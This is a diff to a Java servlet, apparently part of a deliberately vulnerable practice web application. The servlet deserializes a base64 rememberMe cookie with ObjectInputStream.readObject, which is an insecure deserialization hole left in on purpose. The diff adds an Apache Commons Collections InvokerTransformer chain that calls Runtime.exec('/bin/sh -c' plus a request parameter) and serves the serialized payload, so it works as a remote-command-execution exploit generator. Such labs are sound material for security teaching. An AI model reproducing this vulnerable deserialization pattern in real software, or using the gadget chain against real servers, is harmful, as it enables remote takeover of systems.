@@ -5,6 +5,10 @@ import com.pika.electricrat.web.servlet.BaseServlet;
 import jakarta.servlet.*;
 import jakarta.servlet.http.*;
 import jakarta.servlet.annotation.*;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
 
 import java.io.*;
 import java.util.Base64;
@@ -27,7 +31,7 @@ public class SerializeServlet extends BaseServlet {
                 ByteArrayInputStream bytes = new ByteArrayInputStream(decode);
                 ObjectInputStream in = new ObjectInputStream(bytes);
                 Object o = in.readObject();
-                response.getWriter().append(((UserSerializeEntity)o).getRes());
+                response.getWriter().append(o.toString());
                 in.close();
             } else {
                 response.getWriter().append("请携带 Cookie rememberMe 进行请求。");
@@ -42,11 +46,19 @@ public class SerializeServlet extends BaseServlet {
         response.setContentType("text/plan;charset=utf-8");
         String cmd = request.getParameter("cmd");
         ServletOutputStream out = response.getOutputStream();
-        UserSerializeEntity entity = new UserSerializeEntity();
-        entity.setCmd(cmd!=null?cmd:"whoami");
+        //创建Transformer数组
+        Transformer[] invokerTransforms = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer("exec",new Class[]{String[].class},new Object[]{new String[]{"/bin/sh", "-c",cmd}})
+        };
+        //创建ChainedTransformer实例
+        ChainedTransformer c = new ChainedTransformer(invokerTransforms);
+        UserSerializeEntity entity = new UserSerializeEntity(c);
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-        ObjectOutputStream oo = new ObjectOutputStream(outputStream);
-        oo.writeObject(entity);
+        ObjectOutputStream oos = new ObjectOutputStream(outputStream);
+        oos.writeObject(entity);
         byte[] res = Base64.getEncoder().encode(outputStream.toByteArray());
         out.write(res);
     }
@@ -72,7 +84,6 @@ public class SerializeServlet extends BaseServlet {
         Cookie[] cookies = request.getCookies();
         if(cookies != null && cookies.length > 0){
             for (Cookie i : cookies) {
-                System.out.println(i.getName());
                 if (i.getName().equals("rememberMe") && i.getValue() != null && i.getValue().length() > 0) {
                     return i;
                 } else {
